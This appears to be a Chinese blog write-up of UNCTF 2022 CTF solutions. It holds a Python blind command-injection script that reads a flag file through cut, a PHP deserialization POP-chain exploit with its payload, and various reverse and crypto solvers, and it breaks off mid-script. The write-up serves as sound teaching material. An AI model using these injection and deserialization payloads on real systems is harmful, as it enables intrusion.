<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165533052.png" alt="image-20230711165533052"></p>
<p>饶了我把，wasm逆向真的不会，于是回到js代码看，看还有没有什么办法</p>
<p>于是我想这个js和wasm都能被访问到，那么能不能借用这个运行环境去跑这个函数呢，反正正向的参数我们都已经拿到了，事实证明真的可以。</p>
<p>我们先把allowcatedinvitedcode计算出来</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165542605.png" alt="image-20230711165542605"></p>
<p>然后再调用check_success函数去得到result，但是这里有个merged.value不知道是啥，猜测既然要我们玩2048，那最后应该要检查一开始的邀请码和最后游戏结束的得分，于是填了个2048进去，就真的出了flag</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165602583.png" alt="image-20230711165602583"></p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165558770.png" alt="image-20230711165558770"></p>
<p>真是个好题，真是难死我了</p>
<p>flag:<code>UNCTF&#123;hap9y_2048_game_w1th_unc7f2022~&#125;</code></p>
<h2 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy_rce"></a>easy_rce</h2><p>提示是rce布尔盲注，参考 <a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/命令注入之盲注/">https://johnfrod.top/ctf/命令注入之盲注/</a></p>
<p>如果有回显的话,tac /f??? 就能直接出，但是这里要盲注，而且提示是布尔盲注，那就得写脚本去截取flag一个一个的字符再去判断了，还好这边有success可以判断，不需要去sleep</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url= <span class="string">&quot;http://6116bb7b-e387-48a6-bdd7-523933ecef15.node.yuzhian.com.cn/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(j)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        k=<span class="built_in">chr</span>(k)</span><br><span class="line">        payload = <span class="string">&quot;?code=&quot;</span> + <span class="string">f&quot;[ $(cut -c <span class="subst">&#123;j&#125;</span> /f???) = <span class="subst">&#123;k&#125;</span> ]&quot;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> requests.get(url=url+payload).text):</span><br><span class="line">            result+=k</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
<p>flag: <code>UNCTF&#123;99668549-9c1c-4588-b4a9-d5c2bcf977de&#125;</code></p>
<h2 id="poppop"><a href="#poppop" class="headerlink" title="poppop"></a>poppop</h2><p>一道pop链构造反序列化题，但是有两个点</p>
<p>一个是php7.1以下对类属性敏感，不能将private换成public </p>
<p>一个是因为private反序列化后有不可见字符，所以我们要将payload进行URLencode后输出</p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class A&#123; </span><br><span class="line">	public $code; </span><br><span class="line">	function __construct()&#123; </span><br><span class="line">		$this-&gt;code = &#x27;phpinfo();&#x27;; </span><br><span class="line">	&#125; </span><br><span class="line">&#125; </span><br><span class="line">class B&#123; </span><br><span class="line">	public $key; </span><br><span class="line">	function __construct()&#123; </span><br><span class="line">		$this-&gt;key = new C(); </span><br><span class="line">	&#125; </span><br><span class="line">&#125; </span><br><span class="line">class C&#123; </span><br><span class="line">	private $key2; </span><br><span class="line">	function __construct()&#123; </span><br><span class="line">	$a = new A(); </span><br><span class="line">	$this-&gt;key2 = $a; </span><br><span class="line">	&#125; </span><br><span class="line">&#125; </span><br><span class="line">$b = new B(); </span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>
<p>输出之后需要在A类后面的数字加一绕过__wakeup</p>
<p>Payload:<code>O%3A1%3A%22B%22%3A1%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D%7D</code></p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165842960.png" alt="image-20230711165842960"></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="whereisyourkey"><a href="#whereisyourkey" class="headerlink" title="whereisyourkey"></a>whereisyourkey</h2><p>进到main函数，发现ooooo函数执行之后判断，进到ooooo函数里面，很简单的if判断</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165907989.png" alt="image-20230711165907989"></p>
<p>直接上脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s=[118,103,112,107,99,109,104,110,99,105]</span><br><span class="line">for i in s:</span><br><span class="line">    if i==109:</span><br><span class="line">        print(chr(i),end=&#x27;&#x27;)</span><br><span class="line">    elif i&lt;=111:</span><br><span class="line">        if i&lt;=110:</span><br><span class="line">            i=i-2</span><br><span class="line">            print(chr(i),end=&#x27;&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            i=i+3</span><br><span class="line">            print(chr(i),end=&#x27;&#x27;)</span><br><span class="line">#eiamflag</span><br></pre></td></tr></table></figure>
<p>flag:<code>UNCTF&#123;eiamflag&#125;</code></p>
<h2 id="ezzzzre"><a href="#ezzzzre" class="headerlink" title="ezzzzre"></a>ezzzzre</h2><p>拖进ida发现没有逆出来，应该是有壳，查了个壳发现是UPX的壳，直接UPX Shell脱壳</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165939415.png" alt="image-20230711165939415"></p>
<p>Shift+F12查看字符串，找到flag关键词，定位到main函数，进main函数看看</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165950703.png" alt="image-20230711165950703"></p>
<p>发现也是个很简单的比较，将输入的字符串逐位与aHelloctf数组的逐位进行简单计算比较，跟进aHelloctf，发现就是HELLOCTF，于是写个简单脚本跑出来结果</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711165959409.png" alt="image-20230711165959409"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=&#x27;HELLOCTF&#x27;</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    print(chr(2*ord(s[i:i+1])-69),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
<p>flag:<code>UNCTF&#123;KESSYAcG&#125;</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="md5-1"><a href="#md5-1" class="headerlink" title="md5-1"></a>md5-1</h2><p>很简单的md5爆破，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data=f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span> md5(<span class="built_in">chr</span>(j).encode()).hexdigest()==i:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>flag:<code>UNCTF&#123;e84fed028b9046fc0e8f080e96e72184&#125;</code></p>
<h2 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a>dddd</h2><p>把1换成点，把0换成杠，摩斯密码在线解密一下</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711170132246.png" alt="image-20230711170132246"></p>
<p>flag:<code>UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;</code></p>
<h2 id="caesar"><a href="#caesar" class="headerlink" title="caesar"></a>caesar</h2><p>换一个凯撒的表即可，简单脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dic=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span> s[i:i+<span class="number">1</span>] <span class="keyword">not</span> <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="built_in">print</span>(s[i:i+<span class="number">1</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(dic[(dic.index(s[i:i+<span class="number">1</span>])+<span class="number">19</span>)%<span class="number">64</span>:(dic.index(s[i:i+<span class="number">1</span>])+<span class="number">19</span>)%<span class="number">64</span>+<span class="number">1</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar&#125;</span></span><br></pre></td></tr></table></figure>
<p>flag:<code>UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar&#125;</code></p>
<h2 id="md5-2"><a href="#md5-2" class="headerlink" title="md5-2"></a>md5-2</h2><p>和第一个md5一个道理，就是多了个异或，写个脚本把异或加进去就好了，注意这里有个坑，hex不会补齐32位，需要手动条件补齐，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:\\Users\\WXDN\\Desktop\\md5-2\\out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data=f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data)-<span class="number">1</span>):</span><br><span class="line">        data[i+<span class="number">1</span>]=<span class="built_in">hex</span>(<span class="built_in">int</span>(data[i],<span class="number">16</span>)^<span class="built_in">int</span>(data[i+<span class="number">1</span>],<span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(i)&lt;<span class="number">32</span>:</span><br><span class="line">            i=<span class="string">&#x27;0&#x27;</span>*(<span class="number">32</span>-<span class="built_in">len</span>(i))+i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span> md5(<span class="built_in">chr</span>(j).encode()).hexdigest()==i:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#UNCTF&#123;a197271943ceb3c3fe98bcadf10c29d4&#125;</span></span><br></pre></td></tr></table></figure>
<p>flag:    <code>UNCTF&#123;a197271943ceb3c3fe98bcadf10c29d4&#125;</code></p>
<h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>N=p**4,直接用gmpy2的iroot解出p，下面直接给了phi的算法，直接可以得到d，然后解题，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span></span><br><span class="line">p=iroot(n,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span></span><br><span class="line">phi_n=p**<span class="number">4</span>-p**<span class="number">3</span></span><br><span class="line">d=invert(e,phi_n)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;unctf&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>flag: <code>UNCTF&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;</code></p>
<h2 id="Single-table"><a href="#Single-table" class="headerlink" title="Single table"></a>Single table</h2><p>根据readme的提示，密码表就是将ABCDEFGHIKLMNOPQRSTUVWXYZ按顺序排列，再取出key中的字母放在结尾，再组成5*5的方阵</p>
<p>然后就是playfair的加密方式</p>
<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44827634/article/details/124215535">https://blog.csdn.net/qq_44827634/article/details/124215535</a></p>
<p>对照一下就好了</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711170335164.png" alt="image-20230711170335164"></p>
<p>flag: <code>UNCTF&#123;GOD_YOU_KNOW_PLAYFAIR&#125;</code></p>
<h2 id="Multi-table"><a href="#Multi-table" class="headerlink" title="Multi table"></a>Multi table</h2><p>知道代码原理的人应该可以一眼看出是维吉尼亚，但是我看不出来，就只能慢慢推。思路就是根据前面的UNCTF爆破出key的值，再用key的值去解密文</p>
<p>完整脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line">base_table=[<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line">str1=<span class="string">&#x27;SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;&#x27;</span></span><br><span class="line">table=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]</span><br><span class="line">key=[]</span><br><span class="line">flag=<span class="string">&#x27;UNCTF&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> table[j][base_table.index(flag[i:i+<span class="number">1</span>])]==str1[i:i+<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">                key.append(j)</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line">m=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">if</span> str1[i:i+<span class="number">1</span>] <span class="keyword">not</span> <span class="keyword">in</span> base_table:</span><br><span class="line">        m+=str1[i:i+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m+=base_table[table[key[x%<span class="number">4</span>]].index(str1[i:i+<span class="number">1</span>])]</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125;</span></span><br></pre></td></tr></table></figure>
<p>flag：<code>UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125;</code></p>
<h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>m的高位攻击，不会写脚本，百度大法，找到风二西的脚本</p>
<p>参考<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv13467999/">https://www.bilibili.com/read/cv13467999/</a></p>
<p>因为e变成了6，所以函数里面有个位置也要改成6，对了要sage的环境，在线的可能不行因为要导入库</p>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711170457114.png" alt="image-20230711170457114"></p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase2</span>(<span class="params">high_m, n, c</span>):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    m = high_m + x</span><br><span class="line">    M = m((m^<span class="number">6</span> - c).small_roots()[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(M)))</span><br><span class="line"></span><br><span class="line">n= <span class="number">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span></span><br><span class="line">e= <span class="number">6</span></span><br><span class="line">c= <span class="number">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span></span><br><span class="line">M= <span class="number">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span></span><br><span class="line"></span><br><span class="line">phase2(M, n, c)</span><br><span class="line"><span class="comment">#UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;</span></span><br></pre></td></tr></table></figure>
<p>flag ：<code>UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;</code></p>
<h2 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h2><p>这题是已知p的高位攻击，sage脚本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">n=102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span><br><span class="line">p4=8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857 #p4为p去除0的剩余位</span><br><span class="line">e = 0x10001</span><br><span class="line">pbits =1024   #p的原本位数</span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line">print(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=2^kbits, beta=0.4)</span><br><span class="line">if roots:        </span><br><span class="line">    p = p4+int(roots[0]) </span><br><span class="line">    print(&quot;n= &quot;+str(n))</span><br><span class="line">    print(&quot;p= &quot;+str(p))</span><br><span class="line">    print(&quot;q= &quot;+str(n//p))</span><br><span class="line">&#x27;&#x27;&#x27;n= 102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span><br><span class="line">p= 13150231070519276795503757637337326535824298772055543325920447062237907554543786311611680606624189166397403108357856813812282725390555389844248256805325917</span><br><span class="line">q= 7763324082495716852870824316200424018139567206154696104953385573761033160220038511251268217230653629388520339723337700045392099450472580225771046069366909&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/slagman34/Pictures/main/image-20230711170554304.png" alt="image-20230711170554304"></p>
<p>有了p,q之后就最基本的解了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n= <span class="number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line">p= <span class="number">13150231070519276795503757637337326535824298772055543325920447062237907554543786311611680606624189166397403108357856813812282725390555389844248256805325917</span></span><br><span class="line">q= <span class="number">7763324082495716852870824316200424018139567206154696104953385573761033160220038511251268217230653629388520339723337700045392099450472580225771046069366909</span></span><br><span class="line">e= <span class="number">0x10001</span></span><br><span class="line">c= <span class="number">6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;It is a very_intersting_test!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>flag:<code>UNCTF&#123;It is a very_intersting_test!!!&#125;</code></p>
<h2 id="ezxor"><a href="#ezxor" class="headerlink" title="ezxor"></a>ezxor</h2><p>根据题目描述和代码，很典型的<a target="_blank" rel="noopener" href="http://www.baidu.com/link?url=Sb5jMW-5I0N9NXbbRcj5Tn0HLaBKKMGrHGcMo48ojpmwfwmWX-7lRWjoHIWwBeFz">Many-Time-Pad 攻击</a></p>
<p>找了个脚本，要在同目录下创建个Problem.txt的文件，里面放密文</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span 